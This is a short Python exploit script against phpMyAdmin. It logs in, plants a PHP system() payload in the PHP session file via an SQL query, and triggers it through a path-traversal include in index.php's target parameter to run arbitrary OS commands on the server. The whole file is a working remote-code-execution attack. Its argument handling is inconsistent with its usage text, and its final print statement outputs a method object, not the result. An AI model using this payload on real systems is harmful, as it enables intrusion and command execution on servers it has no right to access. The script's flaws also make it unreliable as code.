#!/usr/bin/env python

import re, requests, sys, html


if len(sys.argv) < 4:
  usage = """Usage: {} [ipaddr] [port] [path] [username] [password] [command]
Example: {} 192.168.56.65 8080 /phpmyadmin username password whoami"""
  print(usage.format(sys.argv[0],sys.argv[0]))
  exit()

def get_token(content):
  s = re.search('token"\s*value="(.*?)"', content)
  token = html.unescape(s.group(1))
  return token

ipaddr = sys.argv[1]
username = sys.argv[2]
password = sys.argv[3]
command = sys.argv[4]

url = "http://{}".format(ipaddr)

# 1st req: check login page and version
url1 = url + "/index.php"
r = requests.get(url1)
content = r.content.decode('utf-8')

s = re.search('PMA_VERSION:"(\d+\.\d+\.\d+)"', content)
version = s.group(1)

# get 1st token and cookie
cookies = r.cookies
token = get_token(content)

# 2nd req: login
p = {'token': token, 'pma_username': username, 'pma_password': password}
r = requests.post(url1, cookies = cookies, data = p)
content = r.content.decode('utf-8')
s = re.search('logged_in:(\w+),', content)
logged_in = s.group(1)

#print(content)

# get 2nd token and cookie
cookies = r.cookies
token = get_token(content)

# 3rd req: execute query
url2 = url + "/import.php"
# payload
payload = '''select '<?php system("{}") ?>';'''.format(command)
p = {'table':'', 'token': token, 'sql_query': payload }
r = requests.post(url2, cookies = cookies, data = p)

# 4th req: execute payload
session_id = cookies.get_dict()['phpMyAdmin']
url3 = url + "/index.php?target=db_sql.php%253f/../../../../../../../../var/lib/php/session/sess_{}".format(session_id)
r = requests.get(url3, cookies = cookies)

# get result
content = r.content.decode('utf-8', errors="replace")
s = re.search("select '(.*?)\n'", content, re.DOTALL)

print(s.span)
